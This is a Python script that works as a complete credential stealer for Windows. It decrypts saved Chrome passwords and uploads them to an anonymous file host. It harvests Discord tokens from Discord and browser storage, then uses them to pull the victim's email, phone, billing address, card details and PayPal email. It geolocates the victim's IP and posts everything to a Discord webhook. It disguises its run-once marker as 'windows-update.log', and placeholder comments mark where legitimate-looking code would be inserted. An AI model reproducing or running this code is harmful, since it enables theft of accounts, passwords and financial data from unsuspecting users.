from Crypto.Cipher import AES
import datetime, os, json, base64, shutil, win32crypt, sqlite3, dhooks, requests, re, anonfile
from datetime import datetime, timedelta

WebhookUrl = "WebhookHere"





Hook = dhooks.Webhook(WebhookUrl)
Tokens = []
CheckedTokens = []
Usernames = []
passwords = []









cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}

ip = requests.get('https://api.my-ip.io/ip').text
ipGeoData = requests.get(f'https://ipinfo.io/{ip}')
GeoData = ipGeoData.json()
City = GeoData['city']
State = GeoData['region']
Country = GeoData['country']



def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens



def send(token):
    global passwordsurl
    tokenEmbed = dhooks.Embed(
        description=f"Token : {token}",
        timestamp='now'
    )
    aaa = requests.get(f"https://discord.com/api/v9/users/@me/relationships", headers={'authorization': token})
    aa = aaa.json()

    res = requests.get(f"https://canary.discordapp.com/api/v6/users/@me", headers={'authorization': token})
    res_json = res.json()
    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
    user_id = res_json['id']
    avatar_id = res_json['avatar']
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png'
    phone_number = res_json['phone']
    email = res_json['email']
    mfa_enabled = res_json['mfa_enabled']
    if phone_number == None:
        phone_number = ":x:"
    if email == None:
        email = ":x:"
    if mfa_enabled == None:
        mfa_enabled = ":x:"
    else:
        mfa_enabled = ":white_check_mark:"
    has_nitro = False
    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'authorization': token})
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    if has_nitro:
        nitro = ":white_check_mark:"
    else:
        nitro = ":x:"
    for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'authorization': token}).json():
        y = x['billing_address']
        Billingname = y['name']
        Billingaddress_1 = y['line_1']
        Billingcity = y['city']
        Billingpostal_code = y['postal_code']
        Billingstate = y['state']
        if Billingname != None:
            tokenEmbed.add_field(name=f'Billing Info\nName : {Billingname}\nAddress : {Billingaddress_1}\nCity : {Billingcity}\nZip : {Billingpostal_code}', value=f"•")
        if x['type'] == 1:
            cc_brand = x['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = x['last_4']
            cc_month = str(x['expires_month'])
            cc_year = str(x['expires_year'])
            tokenEmbed.add_field(name=f'Credit Card\nBrand : {cc_brand}\nNumber : {cc_first}••••••••{cc_last}\nMonth : {cc_month}\nYear : {cc_year}', value=f"•")
        elif x['type'] == 2:
            data = {
                'Valid': not x['invalid'],
                'PayPal Email': x['email'],
                }
            tokenEmbed.add_field(name=f'Paypal\nEmail : {x["email"]}\nValid : {not x["invalid"]}', value="•")





    tokenEmbed.set_author(user_name, icon_url=avatar_url)
    tokenEmbed.add_field(name=f'Phone : {phone_number}\n2FA : {mfa_enabled}\nNitro : {nitro}\nEmail : {email}', value="•")
    tokenEmbed.add_field(name=f'IP : {ip}\nCountry : {Country}\nState : {State}\nCity : {City}', value=f"[**Passwords**]({passwordsurl})", inline= True)
    Hook.send(embed=tokenEmbed)





def passwordLog():
        try:
            global passwords
            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""

            key = get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                username = row[2]
                password = decrypt_password(row[3], key)
                row[4]
                row[5]
                if username or password:
                    passwords.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {password}" + "\n" + "-" * 50 + "\n")
                else:
                    continue
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass
        except Exception as e:
            print(e)


def TokenCheck(Token):
    tokenStatus = requests.get(f"https://canary.discordapp.com/api/v6/users/@me", headers={'authorization': Token})
    if tokenStatus.status_code == 401:
        return False
    elif tokenStatus.status_code == 200:
        return True
    else:
        pass

def main():
    global passwordsurl
    passwordLog()
    homedir = os.path.expanduser("~")
    with open(f"{homedir}\\test.txt", "w") as f:
        for password in passwords:
            f.write(password)
    try:
        anon = anonfile.AnonFile()
        upload = anon.upload(f"{homedir}\\test.txt")
        passwordsurl = upload.url.geturl()
    except:
        passwordsurl = "https://www.google.com"
        pass
    global CheckedTokens
    global Tokens
    global Usernames
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                if token in CheckedTokens:
                    pass
                else:
                    if TokenCheck(token) == True:
                        Tokens.append(token)
                        res = requests.get(f"https://canary.discordapp.com/api/v6/users/@me", headers={'authorization': token})
                        res_json = res.json()
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        if user_name in Usernames:
                            pass
                        else:
                            Tokens.append(token)
                            Usernames.append(user_name)
                            send(token)
                    else:
                        pass

            CheckedTokens.append(token)
        else:
            pass


def IsThisTheFirstTime():
    homedir = os.path.expanduser("~")
    if os.path.isfile(f"{homedir}\\windows-update.log") == True:
        return False
    else:
        f = open(f"{homedir}\\windows-update.log", "w")
        f.close()
        main()

IsThisTheFirstTime()


# Start Real Code Here



# End Real Code Here
